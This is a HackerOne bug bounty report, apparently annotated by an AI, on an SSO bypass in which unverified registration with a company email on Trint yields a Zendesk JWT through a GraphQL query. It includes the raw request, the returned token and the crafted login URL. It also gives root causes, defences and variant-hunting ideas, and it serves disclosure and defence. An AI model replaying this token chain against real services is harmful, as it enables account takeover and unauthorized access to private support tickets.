# SSO Bypass in Zendesk via Unverified Email Registration in Trint

## Metadata
- **Source:** HackerOne
- **Report:** 734936 | https://hackerone.com/reports/734936
- **Submitted:** 2019-11-11
- **Reporter:** sopankbegitu
- **Program:** Trint
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Authentication Bypass, Insufficient Email Verification, JWT Token Misuse, Broken Access Control, Account Takeover
- **CVEs:** None
- **Category:** auth-crypto

## Summary
An attacker could register an unverified email account on app.trint.com using organization domain emails (e.g., support+1@trint.com), then leverage the GraphQL API to obtain a Zendesk JWT token, gaining unauthorized access to internal support tickets. The lack of email verification during registration combined with implicit trust of the Trint SSO in Zendesk allowed attackers to impersonate legitimate organization members.

## Attack scenario
1. Register on app.trint.com with a claimed organization email address (support+1@trint.com) without email verification requirement
2. Obtain valid JWT authentication token from Trint's authentication system despite email not being verified
3. Query the GraphQL endpoint (graphql2.trint.com) with the zendeskToken operation to retrieve a Zendesk-compatible JWT token
4. Craft malicious URL with the Zendesk JWT token: https://trintsupport.zendesk.com/access/jwt?jwt=[TOKEN]
5. Access the URL to automatically authenticate as the claimed email user in Zendesk
6. Read sensitive internal ticket information via https://support.trint.com/hc/en-us/requests/organization

## Root cause
Multiple authentication design flaws: (1) app.trint.com allows registration with organization domain emails without email verification, (2) Trint's authentication system issues valid JWT tokens for unverified accounts, (3) GraphQL endpoint exposes zendeskToken operation without additional validation, (4) Zendesk trusts Trint's JWT tokens without re-verifying email ownership, (5) No validation that the email claiming an organization actually owns or is authorized to use the domain

## Attacker mindset
An external attacker discovered that email verification was missing during registration and realized they could claim any organization email address. They then explored the application's GraphQL API surface, found an undocumented zendeskToken operation, and chained the unverified account with the SSO integration to gain unauthorized access to internal support systems.

## Defensive takeaways
- Implement mandatory email verification before account activation, especially for organization domain emails
- Validate email ownership before allowing claims of domain-based email addresses
- Enforce stricter validation in SSO token generation—verify the user's email has been confirmed
- Implement rate limiting and anomaly detection on account registration with organization domains
- Apply principle of least privilege to GraphQL operations—restrict zendeskToken generation to verified users
- Add additional context validation in Zendesk's JWT verification (e.g., re-validate email against source system)
- Implement audit logging for all SSO token generation and unusual email registrations
- Use email domain allowlisting if organization-specific registration is necessary
- Conduct security review of all GraphQL operations to identify unintended information exposure

## Variant hunting
Check for similar email verification bypass patterns in other SSO integrations (Slack, Okta, etc.)
Investigate if other GraphQL operations expose sensitive tokens or data without proper authorization
Test if organization domain emails can be registered without verification in other Trint services
Examine if the plus-addressing bypass (support+1@) bypasses any email validation regex patterns
Check if other SSO providers (GitHub, Google, etc.) trust Trint's unverified accounts
Verify if JWT tokens are validated against a current user state database or only decoded without state check
Test if account takeover is possible with other variations of organization emails (support@, admin@, etc.)

## MITRE ATT&CK
- T1190
- T1078
- T1556
- T1110
- T1598
- T1566

## Notes
This is a critical authentication chain vulnerability where each individual flaw (missing email verification, overly permissive GraphQL endpoint, trusting SSO tokens) is exploitable in isolation but devastating when combined. The attacker didn't need to compromise any systems—they simply exploited the lack of fundamental authentication controls. The use of GraphQL discovery and token manipulation shows sophisticated attack methodology.

## Full report
<details><summary>Expand</summary>

#Summary
hello there because in `app.trint.com` there's no email verification i able to login in your `zendesk SSO` using your organization
your organization using domain `*@trint.com` because there's no email verification i able to read and takeover + claim this email
`support+1@trint.com` and i able to login in zendesk SSO using that email.

#How to reproduce
* i registered in `app.trint.com` using this email `support+1@trint.com` until registration step finish
* i check my burp history there's a `graphql` request in this host `https://graphql2.trint.com/`
* i use this query

```
POST / HTTP/1.1
Host: graphql2.trint.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.trint.com/
content-type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWRjOTUwZWEzOGFhMjI3MmExNzAyMzFkIiwiaHR0cHM6Ly9hcHAudHJpbnQuY29tL2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9zY2hlbWEudHJpbnQuY29tL2F1dGhqdGkiOiI0ZmMwMjUyZS03NTFiLTQwNjctOWU0MC00OGQ4MWMzMjRiMjIiLCJpc3MiOiJodHRwczovL3RyaW50LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZGM5NTBlYTM4YWEyMjcyYTE3MDIzMWQiLCJhdWQiOiJ0cmludC1hcGlzIiwiaWF0IjoxNTczNDc0NTQyLCJleHAiOjE1NzYwNjY1NDIsImF6cCI6ImljaDRoeVZZUEtLZ2VFb1RoNmZXUFhjNmZydmVUY1RxIiwiZ3R5IjoicGFzc3dvcmQifQ.JyIc6PZyjidptrvaFT6MykOr0BopUi1F7fZWTvbeKeU
X-Trint-Request-Id: 4b2f23d5-98a3-4571-a9e1-4218cca76e1b
X-Trint-Super-Properties: {}
Origin: https://app.trint.com
Content-Length: 111
Connection: close

{"operationName":null,"variables":{"status":"PENDING"},"query":"query zendeskToken {\n    zendeskToken\n  }\n"}
```

>response header
```
HTTP/1.1 200 OK
Date: Mon, 11 Nov 2019 12:17:06 GMT
Content-Type: application/json
Content-Length: 272
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
Vary: Accept-Encoding

{"data":{"zendeskToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM"}}
```

* i crafted this url `https://trintsupport.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1NzM0NzQ2MjYsImp0aSI6IjcwOWM2Njg3LWI3OWUtNDI2ZC04MjJhLWVkYTUyYzM3ZDAyYyIsIm5hbWUiOiJzZGFkc2FzZGEgYXNkc2FkYXMiLCJlbWFpbCI6InN1cHBvcnQrMUB0cmludC5jb20ifQ.G8VnRzcF5vkDl4X36_-olJNjtdawMn5G0KaL0FHPdQM`

* boom logged in in ticket using email `support+1@trint.com`

#POC

{F631462}

## Impact

#Impact
* i can read your ticket organization request through `https://support.trint.com/hc/en-us/requests/organization`

</details>

---
*Analysed by Claude on 2026-05-24*
